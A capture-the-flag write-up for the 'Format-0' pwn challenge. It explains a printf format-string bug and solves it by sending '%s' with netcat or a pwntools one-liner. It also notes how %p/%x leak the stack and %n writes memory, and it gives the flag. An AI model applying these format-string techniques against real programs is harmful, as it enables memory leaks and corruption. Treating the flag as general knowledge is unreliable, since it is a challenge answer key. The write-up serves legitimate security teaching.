---
title: "Format-0"
ctf: "Pwny-CTF"
category: "pwn"
difficulty: "Not specified"
points: 50
techniques: ["format-string", "pie-bypass"]
tools: ["pwntools", "netcat", "socat", "python"]
keywords: ["Format-0", "Pwny-CTF", "pwn", "format-string", "pie-bypass", "pwntools", "netcat", "socat", "python", "pie", "stack"]
status: "solved"
has_script: true
source: "Pwny-CTF/CHALLENGES/Pwn/Format-0/notes.md"
---

# Format-0 (Pwny-CTF, pwn)

## Summary
Challenge **Format-0** from the Pwny-CTF CTF, pwn category. Main technique: format-string. User input = 1st argument of printf -> format string bug. Useful specifiers: %s (reads a dotted string), %p/%x (reads the stack), %n (writes!).

## Statement and artefacts
format string attacks are cool

Code (challenge_prompt.c):
  void vuln(char *string) {
      char* flag = "sigpwny{XXXX}";
      printf(string, flag);        // <-- user-controlled format string (argv[1])
  }
  int main(int argc, char **argv) { setup(); vuln(argv[1]); }

The remote binary (Dockerfile: gcc -m32 -no-pie -fno-stack-protector, served by socat + wrapper.py) takes your input as argv[1] and executes printf(input, flag).

**Provided files / artifacts:**
- `Dockerfile (file, 488 B)`

## Recognition signals
- Signal: printf(fmt, flag): if fmt contains %s, printf reads the 1st argument (the flag pointer) and displays the pointed string -> the flag.
- Signal: Trap pwntools: io.send() returns None; separate sending (sendline) and receiving (recvall/recvline). The wrapper reads a LINE -> need the \n (sendline).

## Resolution method
1. The remote (socat + wrapper.py) passes your stdin line as `argv[1]`.
2. Send `%s` → printf displays `flag`.
   - `nc chal.sigpwny.com 1338` then type `%s` + Enter.
   - or pwntools: `io.sendline(b"%s"); print(io.recvall())`.
3. Flag: `sigpwny{strings_are_fun}`.

1. **Flaw**

```c
void vuln(char *string){ char* flag="sigpwny{...}"; printf(string, flag); }
main(){ vuln(argv[1]); }   // string = argv[1] controlled, flag = 1st variadic argument
```
`printf(fmt, flag)`: if `fmt` contains `%s`, printf reads the 1st argument (the `flag` pointer) and displays the pointed string → the flag.

## Discarded approaches
```bash
echo '%s' | nc chal.sigpwny.com 1338
# pwntools
python3 -c 'from pwn import *;io=remote("chal.sigpwny.com",1338);io.sendline(b"%s");print(io.recvall(timeout=2))'
# local:./challenge '%s' (format is argv[1])
```

## Solve script
Script path: [scripts/solve.py](scripts/solve.py)

## Flag
sigpwny{strings_are_fun}

## Lessons and reusable patterns
- User input = 1st argument of printf -> format string bug. Useful specifiers: %s (reads a dotted string), %p/%x (reads the stack), %n (writes!).
- Here trivial because flag is precisely the argument provided to printf. In a real FSB, we scan the stack with %p/%x or %N$p to find the secret.
- pwntools trap: io.send() returns None; separate sending (sendline) and receiving (recvall/recvline). The wrapper reads a LINE -> need the \n (sendline).
